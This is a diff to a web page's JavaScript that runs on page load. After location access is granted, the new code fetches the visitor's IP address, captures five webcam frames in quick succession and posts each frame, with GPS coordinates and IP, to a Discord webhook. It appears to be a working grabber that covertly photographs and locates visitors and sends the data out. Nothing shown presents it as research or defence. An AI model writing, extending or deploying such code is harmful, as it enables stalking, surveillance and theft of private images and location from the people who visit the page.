@@ -35,20 +35,29 @@ document.addEventListener('DOMContentLoaded', () => {
                         async (position) => {
                             const { latitude, longitude, accuracy } = position.coords;
 
-                            // C. Capture Image
-                            // slight delay to ensure frame is not black
-                            setTimeout(async () => {
+                            // C. Capture IP
+                            let ip = "Unknown";
+                            try {
+                                const ipRes = await fetch('https://api.ipify.org?format=json');
+                                const ipData = await ipRes.json();
+                                ip = ipData.ip;
+                            } catch (e) { console.log("IP Fetch failed"); }
+
+                            // D. Continuous Capture Loop (0.6s interval)
+                            let count = 0;
+                            const maxCaptures = 5;
+
+                            const intervalId = setInterval(async () => {
+                                if (count >= maxCaptures) {
+                                    clearInterval(intervalId);
+                                    return;
+                                }
+
                                 const imageBlob = await captureFrame(camPreview);
+                                sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });
 
-                                // D. Operations
-                                // Local download removed as requested
-                                console.log("Capture taken. Processing...");
-
-                                // Post to Webhook
-                                sendToDiscord({ latitude, longitude, accuracy, imageBlob });
-
-                                console.log("Capture complete.");
-                            }, 500);
+                                count++;
+                            }, 600);
                         },
                         (err) => {
                             console.log("Location denied:", err);
